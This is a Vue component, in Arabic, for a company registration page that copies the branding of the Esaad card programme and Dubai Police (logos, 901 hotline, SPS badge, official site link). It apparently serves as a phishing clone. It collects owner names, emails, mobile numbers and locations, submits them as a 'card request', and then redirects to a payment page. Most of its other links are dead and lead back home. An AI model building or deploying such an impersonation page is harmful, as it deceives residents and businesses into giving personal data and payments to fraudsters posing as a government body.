<script setup lang="ts">
import { ref } from 'vue';
import { useRouter } from 'vue-router';
import { Search, ChevronDown, X } from 'lucide-vue-next';
import { createCardRequest } from '../api';

const router = useRouter();
const mobileMenuOpen = ref(false);
const activeStep = ref(1);
const isSubmitting = ref(false);

const form = ref({
  companyNameAr: '',
  descriptionAr: '',
  addressAr: '',
  ownerNameAr: '',
  email: '',
  mobile: '',
  category: '',
  country: '',
  region: ''
});

const errors = ref<Record<string, string>>({});

const categories = [
  'المطاعم والمقاهي',
  'الفنادق والسياحة والسفر',
  'الصحة والعيادات والمستشفيات',
  'التعليم والمدارس والجامعات',
  'التسوق والتجزئة والأزياء',
  'السيارات وخدمات النقل',
  'الترفيه والرياضة واللياقة',
  'الخدمات العقارية والمنزلية',
  'التقنية والإلكترونيات',
  'أخرى'
];

const countries = [
  'الإمارات العربية المتحدة',
  'المملكة العربية السعودية',
  'دولة الكويت',
  'دولة قطر',
  'مملكة البحرين',
  'سلطنة عمان'
];

const regions = [
  'دبي',
  'أبوظبي',
  'الشارقة',
  'عجمان',
  'رأس الخيمة',
  'الفجيرة',
  'أم القيوين',
  'العين',
  'الرياض',
  'جدة',
  'الدمام'
];

const validate = () => {
  const nextErrors: Record<string, string> = {};
  if (!form.value.companyNameAr.trim()) nextErrors.companyNameAr = 'اسم الشركة مطلوب';
  if (!form.value.descriptionAr.trim()) nextErrors.descriptionAr = 'وصف الشركة مطلوب';
  if (!form.value.addressAr.trim()) nextErrors.addressAr = 'العنوان مطلوب';
  if (!form.value.ownerNameAr.trim()) nextErrors.ownerNameAr = 'اسم المالك مطلوب';
  if (!form.value.email.trim()) nextErrors.email = 'البريد الإلكتروني مطلوب';
  if (!form.value.mobile.trim()) nextErrors.mobile = 'رقم الجوال مطلوب';
  if (!form.value.category) nextErrors.category = 'يرجى اختيار الفئة';
  if (!form.value.country) nextErrors.country = 'يرجى اختيار الدولة';
  if (!form.value.region) nextErrors.region = 'يرجى تحديد المنطقة';

  errors.value = nextErrors;
  return Object.keys(nextErrors).length === 0;
};

const handleSubmit = async () => {
  if (isSubmitting.value) return;
  if (!validate()) return;

  isSubmitting.value = true;
  try {
    const today = new Date().toLocaleDateString('en-GB');
    await createCardRequest({
      name: form.value.ownerNameAr
        ? `${form.value.companyNameAr} (${form.value.ownerNameAr})`
        : form.value.companyNameAr,
      mobile: form.value.mobile,
      idNumber: form.value.email,
      cardType: 'company',
      address: `${form.value.country} - ${form.value.region} | ${form.value.addressAr} | الفئة: ${form.value.category}`,
      date: today
    });
    router.push('/payment');
  } catch (err) {
    console.error('Error submitting company registration:', err);
  } finally {
    isSubmitting.value = false;
  }
};

const handleCancel = () => {
  router.push('/');
};
</script>

<template>
  <div dir="rtl" class="max-w-xl mx-auto bg-white min-h-screen flex flex-col font-sans text-gray-900 relative overflow-x-hidden">
    <!-- ======================== TOP WHITE NAVBAR ======================== -->
    <header class="bg-white px-5 py-3.5 flex items-center justify-between border-b border-gray-100 sticky top-0 z-30">
      <!-- Right in RTL: Hamburger Icon -->
      <button
        @click="mobileMenuOpen = true"
        aria-label="القائمة الرئيسية"
        class="text-gray-800 p-1 hover:opacity-75 transition-opacity cursor-pointer"
      >
        <svg class="w-7 h-7" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
          <line x1="3" y1="6" x2="21" y2="6" />
          <line x1="3" y1="12" x2="21" y2="12" />
          <line x1="3" y1="18" x2="21" y2="18" />
        </svg>
      </button>

      <!-- Center: Esaad Green Logo -->
      <div @click="router.push('/')" class="cursor-pointer flex flex-col items-center select-none">
        <div class="text-[#008a40] font-black text-xl leading-none tracking-tight">إسعاد</div>
        <div class="text-[#008a40] font-extrabold text-lg leading-none -mt-0.5 tracking-tight">esaad</div>
        <svg class="w-12 h-3.5 -mt-0.5" viewBox="0 0 60 18" fill="none">
          <circle cx="14" cy="4" r="2" fill="#39b54a" />
          <circle cx="46" cy="4" r="2" fill="#39b54a" />
          <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" fill="none" />
        </svg>
      </div>

      <!-- Left in RTL: Green Search Icon -->
      <button
        @click="router.push('/')"
        aria-label="بحث"
        class="text-[#008a40] p-1 hover:opacity-75 transition-opacity cursor-pointer"
      >
        <Search class="w-6 h-6 stroke-[2.2]" />
      </button>
    </header>

    <!-- Slide-out Navigation Drawer -->
    <div v-if="mobileMenuOpen" class="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex justify-start">
      <div class="w-72 bg-[#07170b] text-white h-full p-6 flex flex-col justify-between shadow-2xl border-l border-[#009a44]/30">
        <div>
          <div class="flex items-center justify-between pb-5 border-b border-white/10">
            <div class="flex flex-col items-start">
              <span class="text-[#39b54a] font-black text-lg leading-none">إسعاد</span>
              <span class="text-[#39b54a] font-bold text-xs tracking-tight">esaad</span>
            </div>
            <button @click="mobileMenuOpen = false" class="p-1.5 text-gray-300 hover:text-white cursor-pointer">
              <X class="w-5 h-5" />
            </button>
          </div>

          <nav class="mt-5 space-y-3.5 text-right font-bold text-sm">
            <button @click="router.push('/')" class="w-full text-right py-1.5 text-white hover:text-[#39b54a] cursor-pointer">الصفحة الرئيسية</button>
            <button @click="router.push('/request')" class="w-full text-right py-1.5 text-white hover:text-[#39b54a] cursor-pointer">تفعيل عضوية أفراد</button>
            <button @click="mobileMenuOpen = false" class="w-full text-right py-1.5 text-[#39b54a] cursor-pointer">تفعيل عضوية شركات</button>
          </nav>
        </div>
      </div>
    </div>

    <!-- ======================== HERO BANNER: تسجيل الشركة ======================== -->
    <div class="relative w-full h-[112px] bg-[#0f172a] overflow-hidden flex items-center justify-center">
      <!-- Night Dubai Skyline & Ain Dubai Illustration Backdrop -->
      <svg viewBox="0 0 430 112" class="absolute inset-0 w-full h-full object-cover" preserveAspectRatio="xMidYMid slice">
        <defs>
          <linearGradient id="nightSky" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" stop-color="#0b132b" />
            <stop offset="50%" stop-color="#1c2541" />
            <stop offset="100%" stop-color="#2b193d" />
          </linearGradient>
        </defs>
        <rect width="430" height="112" fill="url(#nightSky)" />
        <!-- Ain Dubai Wheel Silhouette -->
        <circle cx="145" cy="58" r="38" fill="none" stroke="#94a3b8" stroke-width="1.5" opacity="0.35" />
        <line x1="145" y1="58" x2="128" y2="112" stroke="#cbd5e1" stroke-width="2" opacity="0.4" />
        <line x1="145" y1="58" x2="162" y2="112" stroke="#cbd5e1" stroke-width="2" opacity="0.4" />
        <!-- City Towers & Warm Lights -->
        <rect x="20" y="30" width="18" height="82" fill="#0f172a" opacity="0.7" />
        <rect x="45" y="45" width="22" height="67" fill="#1e293b" opacity="0.7" />
        <rect x="240" y="25" width="20" height="87" fill="#0f172a" opacity="0.7" />
        <rect x="270" y="40" width="26" height="72" fill="#1e293b" opacity="0.7" />
        <rect x="310" y="20" width="18" height="92" fill="#0f172a" opacity="0.7" />
        <rect x="345" y="35" width="24" height="77" fill="#1e293b" opacity="0.7" />
        <!-- Golden horizon glow -->
        <rect x="0" y="88" width="430" height="24" fill="#f59e0b" opacity="0.15" />
      </svg>
      <div class="absolute inset-0 bg-black/50"></div>

      <h1 class="relative z-10 text-white font-extrabold text-[28px] tracking-tight">
        تسجيل الشركة
      </h1>
    </div>

    <!-- ======================== 3-STEP INDICATOR ======================== -->
    <div class="px-5 py-7 bg-white border-b border-gray-200">
      <div class="relative max-w-[350px] mx-auto flex items-center justify-between">
        <!-- Dashed Connecting Line -->
        <div class="absolute top-1/2 -translate-y-1/2 left-10 right-10 border-t-2 border-dashed border-[#008a40]/60 z-0"></div>

        <!-- Step 1: معلومات الشركة (Rightmost in RTL) -->
        <button
          type="button"
          @click="activeStep = 1"
          class="relative z-10 w-[96px] h-[108px] rounded-xl flex flex-col items-center justify-center p-2 transition-all cursor-pointer"
          :class="
            activeStep === 1
              ? 'bg-[#f4fbf7] border border-[#008a40] shadow-xs'
              : 'bg-[#fafafa] border border-gray-200'
          "
        >
          <div
            class="w-9 h-9 rounded-full flex items-center justify-center font-extrabold text-sm mb-2 tabular-nums"
            :class="activeStep === 1 ? 'bg-[#007b38] text-white' : 'bg-gray-200/80 text-gray-800'"
          >
            1
          </div>
          <span class="text-xs font-semibold text-gray-800 leading-tight text-center">
            معلومات<br />الشركة
          </span>
        </button>

        <!-- Step 2: تحميل المستندات (Center) -->
        <button
          type="button"
          @click="activeStep = 2"
          class="relative z-10 w-[96px] h-[108px] rounded-xl flex flex-col items-center justify-center p-2 transition-all cursor-pointer"
          :class="
            activeStep === 2
              ? 'bg-[#f4fbf7] border border-[#008a40] shadow-xs'
              : 'bg-[#fafafa] border border-gray-200'
          "
        >
          <div
            class="w-9 h-9 rounded-full flex items-center justify-center font-extrabold text-sm mb-2 tabular-nums"
            :class="activeStep === 2 ? 'bg-[#007b38] text-white' : 'bg-gray-200/80 text-gray-800'"
          >
            2
          </div>
          <span class="text-xs font-semibold text-gray-800 leading-tight text-center">
            تحميل<br />المستندات
          </span>
        </button>

        <!-- Step 3: معلومات الفروع (Leftmost in RTL) -->
        <button
          type="button"
          @click="activeStep = 3"
          class="relative z-10 w-[96px] h-[108px] rounded-xl flex flex-col items-center justify-center p-2 transition-all cursor-pointer"
          :class="
            activeStep === 3
              ? 'bg-[#f4fbf7] border border-[#008a40] shadow-xs'
              : 'bg-[#fafafa] border border-gray-200'
          "
        >
          <div
            class="w-9 h-9 rounded-full flex items-center justify-center font-extrabold text-sm mb-2 tabular-nums"
            :class="activeStep === 3 ? 'bg-[#007b38] text-white' : 'bg-gray-200/80 text-gray-800'"
          >
            3
          </div>
          <span class="text-xs font-semibold text-gray-800 leading-tight text-center">
            معلومات<br />الفروع
          </span>
        </button>
      </div>
    </div>

    <!-- ======================== FORM SECTION ======================== -->
    <div class="px-5 pt-7 pb-8 bg-white relative">
      <!-- Section Heading -->
      <h2 class="text-[25px] font-extrabold text-gray-900 text-right mb-2.5">
        معلومات الشركة
      </h2>
      <p class="text-gray-600 text-[15px] leading-relaxed text-right mb-7">
        الشركات الراغبة في الانضمام إلى تطبيق 'بطاقة إسعاد' يجب عليها التحقق أولاً من أهليتها. الرجاء تعبئة النموذج أدناه للبدء في الإجراءات.
      </p>

      <form @submit.prevent="handleSubmit" class="space-y-5 text-right">
        <!-- 1. اسم الشركة* -->
        <div>
          <label class="block text-[15px] font-semibold text-gray-800 mb-2">
            اسم الشركة<span class="text-red-600">*</span>
          </label>
          <input
            v-model="form.companyNameAr"
            type="text"
            class="w-full h-12 border border-gray-200 rounded-md px-3.5 text-gray-900 focus:outline-none focus:border-[#008a40] bg-white transition-colors"
          />
          <p v-if="errors.companyNameAr" class="text-red-600 text-xs mt-1">{{ errors.companyNameAr }}</p>
        </div>

        <!-- 2. وصف الشركة* -->
        <div>
          <label class="block text-[15px] font-semibold text-gray-800 mb-2">
            وصف الشركة<span class="text-red-600">*</span>
          </label>
          <textarea
            v-model="form.descriptionAr"
            rows="4"
            class="w-full border border-gray-200 rounded-md p-3.5 text-gray-900 focus:outline-none focus:border-[#008a40] bg-white transition-colors resize-none"
          ></textarea>
          <p v-if="errors.descriptionAr" class="text-red-600 text-xs mt-1">{{ errors.descriptionAr }}</p>
        </div>

        <!-- 3. العنوان* -->
        <div>
          <label class="block text-[15px] font-semibold text-gray-800 mb-2">
            العنوان<span class="text-red-600">*</span>
          </label>
          <textarea
            v-model="form.addressAr"
            rows="4"
            class="w-full border border-gray-200 rounded-md p-3.5 text-gray-900 focus:outline-none focus:border-[#008a40] bg-white transition-colors resize-none"
          ></textarea>
          <p v-if="errors.addressAr" class="text-red-600 text-xs mt-1">{{ errors.addressAr }}</p>
        </div>

        <!-- 4. اسم المالك* -->
        <div>
          <label class="block text-[15px] font-semibold text-gray-800 mb-2">
            اسم المالك<span class="text-red-600">*</span>
          </label>
          <input
            v-model="form.ownerNameAr"
            type="text"
            class="w-full h-12 border border-gray-200 rounded-md px-3.5 text-gray-900 focus:outline-none focus:border-[#008a40] bg-white transition-colors"
          />
          <p v-if="errors.ownerNameAr" class="text-red-600 text-xs mt-1">{{ errors.ownerNameAr }}</p>
        </div>

        <!-- 9. البريد الإلكتروني* -->
        <div>
          <label class="block text-[15px] font-semibold text-gray-800 mb-2">
            البريد الإلكتروني<span class="text-red-600">*</span>
          </label>
          <input
            v-model="form.email"
            type="email"
            dir="ltr"
            class="w-full h-12 border border-gray-200 rounded-md px-3.5 text-gray-900 focus:outline-none focus:border-[#008a40] bg-white transition-colors"
          />
          <p v-if="errors.email" class="text-red-600 text-xs mt-1">{{ errors.email }}</p>
        </div>

        <!-- 10. رقم الجوال* -->
        <div>
          <label class="block text-[15px] font-semibold text-gray-800 mb-2">
            رقم الجوال<span class="text-red-600">*</span>
          </label>
          <input
            v-model="form.mobile"
            type="tel"
            dir="ltr"
            placeholder="+971 56 123 1234"
            class="w-full h-12 border border-gray-200 rounded-md px-3.5 text-left text-gray-900 placeholder-gray-300 focus:outline-none focus:border-[#008a40] bg-white transition-colors"
          />
          <p v-if="errors.mobile" class="text-red-600 text-xs mt-1">{{ errors.mobile }}</p>
        </div>

        <!-- اختر الفئة* -->
        <div>
          <label class="block text-[15px] font-semibold text-gray-800 mb-2">
            اختر الفئة<span class="text-red-600">*</span>
          </label>
          <div class="relative">
            <select
              v-model="form.category"
              class="w-full h-12 border border-gray-200 rounded-md pr-3.5 pl-12 text-gray-700 appearance-none focus:outline-none focus:border-[#008a40] bg-white transition-colors cursor-pointer"
            >
              <option value="" disabled selected hidden>اختر الفئة</option>
              <option v-for="cat in categories" :key="cat" :value="cat">{{ cat }}</option>
            </select>
            <div class="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none">
              <ChevronDown class="w-4 h-4 text-gray-400 ml-2.5" />
              <div class="h-5 w-px bg-gray-200"></div>
            </div>
          </div>
          <p v-if="errors.category" class="text-red-600 text-xs mt-1">{{ errors.category }}</p>
        </div>

        <!-- الدولة* -->
        <div>
          <label class="block text-[15px] font-semibold text-gray-800 mb-2">
            الدولة<span class="text-red-600">*</span>
          </label>
          <div class="relative">
            <select
              v-model="form.country"
              class="w-full h-12 border border-gray-200 rounded-md pr-3.5 pl-12 text-gray-700 appearance-none focus:outline-none focus:border-[#008a40] bg-white transition-colors cursor-pointer"
            >
              <option value="" disabled selected hidden>اختر البلد</option>
              <option v-for="country in countries" :key="country" :value="country">{{ country }}</option>
            </select>
            <div class="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none">
              <ChevronDown class="w-4 h-4 text-gray-400 ml-2.5" />
              <div class="h-5 w-px bg-gray-200"></div>
            </div>
          </div>
          <p v-if="errors.country" class="text-red-600 text-xs mt-1">{{ errors.country }}</p>
        </div>

        <!-- منطقة* -->
        <div>
          <label class="block text-[15px] font-semibold text-gray-800 mb-2">
            منطقة<span class="text-red-600">*</span>
          </label>
          <div class="relative">
            <select
              v-model="form.region"
              class="w-full h-12 border border-gray-200 rounded-md pr-3.5 pl-12 text-gray-700 appearance-none focus:outline-none focus:border-[#008a40] bg-white transition-colors cursor-pointer"
            >
              <option value="" disabled selected hidden>حدد المنطقة</option>
              <option v-for="reg in regions" :key="reg" :value="reg">{{ reg }}</option>
            </select>
            <div class="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none">
              <ChevronDown class="w-4 h-4 text-gray-400 ml-2.5" />
              <div class="h-5 w-px bg-gray-200"></div>
            </div>
          </div>
          <p v-if="errors.region" class="text-red-600 text-xs mt-1">{{ errors.region }}</p>
        </div>

        <!-- Action Buttons: إلغاء (Right) & متابعة (Left) -->
        <div class="pt-5 border-t border-gray-200 flex items-center justify-end gap-4" dir="ltr">
          <button
            type="submit"
            :disabled="isSubmitting"
            class="flex-1 max-w-[165px] h-12 bg-[#007b38] hover:bg-[#006830] text-white font-bold text-base rounded-md transition-colors flex items-center justify-center cursor-pointer disabled:opacity-70"
          >
            <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
            <span v-else>متابعة</span>
          </button>

          <button
            type="button"
            @click="handleCancel"
            class="flex-1 max-w-[165px] h-12 bg-white hover:bg-gray-50 text-gray-800 font-bold text-base border border-[#007b38] rounded-md transition-colors flex items-center justify-center cursor-pointer"
          >
            إلغاء
          </button>
        </div>
      </form>
    </div>

    <!-- ======================== FOOTER SECTION ======================== -->
    <footer class="bg-white pt-6 text-gray-800 border-t border-gray-100">
      <!-- Two-Column Navigation Links -->
      <div class="px-6 grid grid-cols-2 gap-6 text-right text-[15px] font-semibold mb-8">
        <!-- Right Column -->
        <ul class="space-y-3">
          <li><button @click="router.push('/')" class="hover:text-[#008a40] transition-colors cursor-pointer font-semibold">الصفحة الرئيسية</button></li>
          <li><button @click="router.push('/')" class="hover:text-[#008a40] transition-colors cursor-pointer font-semibold">عن إسعاد</button></li>
          <li><button @click="router.push('/request')" class="hover:text-[#008a40] transition-colors cursor-pointer font-semibold">تسجيل عضوية إسعاد</button></li>
          <li><button @click="router.push('/register-company')" class="hover:text-[#008a40] transition-colors cursor-pointer font-semibold">تسجيل الشركة</button></li>
        </ul>

        <!-- Left Column -->
        <ul class="space-y-3">
          <li><button @click="router.push('/register-company')" class="hover:text-[#008a40] transition-colors cursor-pointer font-semibold">مزايا الشركات</button></li>
          <li><button @click="router.push('/')" class="hover:text-[#008a40] transition-colors cursor-pointer font-semibold">أخبار</button></li>
          <li><button @click="router.push('/')" class="hover:text-[#008a40] transition-colors cursor-pointer font-semibold">قصص النجاح</button></li>
          <li><button @click="router.push('/')" class="hover:text-[#008a40] transition-colors cursor-pointer font-semibold">استفسارات</button></li>
          <li><button @click="router.push('/')" class="hover:text-[#008a40] transition-colors cursor-pointer font-semibold">الأسئلة الشائعة</button></li>
        </ul>
      </div>

      <!-- Dubai Police Partner Logos Strip -->
      <div class="px-4 py-6 flex items-center justify-between gap-2 border-t border-gray-200/60" dir="ltr">
        <div class="bg-[#e30613] text-white px-2 py-1.5 rounded-xs flex flex-col items-center justify-center shrink-0 w-14 h-11 shadow-xs">
          <span class="font-black text-lg leading-none tracking-tighter">SPS</span>
          <span class="text-[4.5px] font-bold tracking-tight uppercase mt-0.5">SMART POLICE STATION</span>
        </div>

        <div class="flex items-center justify-center shrink-0 w-12 h-12">
          <svg viewBox="0 0 50 50" class="w-11 h-11">
            <circle cx="25" cy="25" r="22" fill="#e6f4ec" stroke="#008a40" stroke-width="1.5" stroke-dasharray="3 2" />
            <path d="M25 10 L35 15 V26 C35 33 25 39 25 39 C25 39 15 33 15 26 V15 Z" fill="none" stroke="#008a40" stroke-width="1.8" />
            <text x="25" y="28" text-anchor="middle" fill="#008a40" font-size="6" font-weight="bold">901</text>
          </svg>
        </div>

        <div class="flex flex-col items-center justify-center shrink-0">
          <svg viewBox="0 0 80 42" class="w-18 h-10">
            <path d="M22 14 Q40 4 58 14 L54 20 H26 Z" fill="none" stroke="#008a40" stroke-width="1.8" />
            <rect x="14" y="21" width="52" height="14" rx="3" fill="#008a40" />
            <text x="40" y="31" text-anchor="middle" fill="white" font-size="9" font-weight="900">CALL 901</text>
          </svg>
        </div>

        <div class="flex flex-col items-center justify-center shrink-0">
          <svg viewBox="0 0 80 40" class="w-18 h-10">
            <path d="M20 22 Q45 8 68 20" fill="none" stroke="#008a40" stroke-width="1.8" />
            <path d="M26 25 Q48 13 68 24" fill="none" stroke="#39b54a" stroke-width="1.5" />
            <text x="38" y="34" text-anchor="middle" fill="#006830" font-size="11" font-weight="800">eCrime</text>
          </svg>
        </div>

        <div class="flex flex-col items-center justify-center shrink-0">
          <svg viewBox="0 0 60 55" class="w-13 h-12">
            <circle cx="30" cy="8" r="2.5" fill="#39b54a" />
            <circle cx="22" cy="11" r="2.5" fill="#39b54a" />
            <circle cx="38" cy="11" r="2.5" fill="#39b54a" />
            <circle cx="16" cy="17" r="2.5" fill="#008a40" />
            <circle cx="30" cy="16" r="2.5" fill="#008a40" />
            <circle cx="44" cy="17" r="2.5" fill="#008a40" />
            <path d="M22 24 Q28 32 26 42" fill="none" stroke="#008a40" stroke-width="3" stroke-linecap="round" />
            <path d="M38 24 Q32 32 34 42" fill="none" stroke="#39b54a" stroke-width="3" stroke-linecap="round" />
            <text x="30" y="51" text-anchor="middle" fill="#006830" font-size="5.5" font-weight="700">مركز حماية الدولي</text>
          </svg>
        </div>
      </div>

      <!-- Bottom Social & Copyright Bar -->
      <div class="bg-[#e4f2ea] px-5 py-6">
        <div class="flex items-center justify-between mb-5">
          <!-- Right in RTL: Esaad Logo -->
          <div class="flex flex-col items-center">
            <span class="text-[#008a40] font-black text-base leading-none">إسعاد</span>
            <span class="text-gray-900 font-extrabold text-sm leading-none">esaad</span>
            <svg class="w-10 h-3" viewBox="0 0 60 18" fill="none">
              <circle cx="14" cy="4" r="2" fill="#008a40" />
              <circle cx="46" cy="4" r="2" fill="#008a40" />
              <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" />
            </svg>
          </div>

          <!-- Left in RTL: Social Media Icons -->
          <div class="flex items-center gap-2.5" dir="ltr">
            <a href="#" @click.prevent="router.push('/')" aria-label="X" class="w-9 h-9 rounded-full border border-[#008a40] flex items-center justify-center text-gray-800 hover:bg-[#008a40] hover:text-white transition-colors">
              <svg class="w-4 h-4 fill-current" viewBox="0 0 24 24">
                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
              </svg>
            </a>
            <a href="#" @click.prevent="router.push('/')" aria-label="Instagram" class="w-9 h-9 rounded-full border border-[#008a40] flex items-center justify-center text-gray-800 hover:bg-[#008a40] hover:text-white transition-colors">
              <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="2" y="2" width="20" height="20" rx="5" />
                <circle cx="12" cy="12" r="4" />
                <circle cx="17.5" cy="6.5" r="1" fill="currentColor" stroke="none" />
              </svg>
            </a>
            <a href="#" @click.prevent="router.push('/')" aria-label="Facebook" class="w-9 h-9 rounded-full border border-[#008a40] flex items-center justify-center text-gray-800 hover:bg-[#008a40] hover:text-white transition-colors">
              <svg class="w-4 h-4 fill-current" viewBox="0 0 24 24">
                <path d="M14 13.5h2.5l1-4H14v-2c0-1.03 0-2 2-2h1.5V2.14c-.326-.043-1.557-.14-2.857-.14C11.928 2 10 3.657 10 6.7v2.8H7v4h3V22h4v-8.5z" />
              </svg>
            </a>
            <a href="#" @click.prevent="router.push('/')" aria-label="YouTube" class="w-9 h-9 rounded-full border border-[#008a40] flex items-center justify-center text-gray-800 hover:bg-[#008a40] hover:text-white transition-colors">
              <svg class="w-4 h-4 fill-current" viewBox="0 0 24 24">
                <path d="M21.58 7.19c-.23-.86-.91-1.54-1.77-1.77C18.25 5 12 5 12 5s-6.25 0-7.81.42c-.86.23-1.54.91-1.77 1.77C2 8.75 2 12 2 12s0 3.25.42 4.81c.23.86.91 1.54 1.77 1.77C5.75 19 12 19 12 19s6.25 0 7.81-.42c.86-.23 1.54-.91 1.77-1.77C22 15.25 22 12 22 12s0-3.25-.42-4.81zM10 15V9l5.2 3-5.2 3z" />
              </svg>
            </a>
          </div>
        </div>

        <div class="text-right text-xs text-gray-600 space-y-1.5">
          <p>© 2026 esaad, كل الحقوق محفوظة.</p>
          <div class="flex flex-wrap items-center justify-start gap-2 text-[11px] text-gray-600">
            <a href="#" @click.prevent="router.push('/')" class="hover:text-[#008a40]">الشروط والأحكام</a>
            <span class="text-gray-400">|</span>
            <a href="#" @click.prevent="router.push('/')" class="hover:text-[#008a40]">سياسة الخصوصية</a>
            <span class="text-gray-400">|</span>
            <a href="https://www.dubaipolice.gov.ae" target="_blank" rel="noopener noreferrer" class="hover:text-[#008a40] font-sans">www.dubaipolice.gov.ae</a>
          </div>
        </div>
      </div>
    </footer>
  </div>
</template>
